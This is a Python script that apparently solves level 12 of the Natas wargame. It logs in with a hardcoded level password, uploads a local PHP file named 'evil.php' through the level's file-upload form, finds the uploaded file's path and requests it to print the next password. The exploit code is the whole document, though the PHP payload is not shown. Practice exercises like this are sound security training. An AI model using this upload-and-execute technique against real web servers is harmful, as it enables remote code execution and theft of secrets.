# -*- coding: utf-8 -*-
from base import get_page, post_page
import re

def natas12():
    username = "natas12"
    password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
    
    with open("natas12.php", "rb") as f:
        evil_file = f.read()
    data = {"MAX_FILE_SIZE":1000, "filename":"evil.php"}
    files = {"uploadedfile":evil_file}
    content = post_page(12, username, password, data=data, files=files)
    upload_path = re.findall(r"(upload/\S{10}.php)", content)
    if not upload_path:
        print("Fail to find password")
        return
    else:
        upload_path = upload_path[0]
    password_content = get_page(12, username, password, "/"+upload_path)
    print(password_content)

if __name__ == "__main__":
    natas12()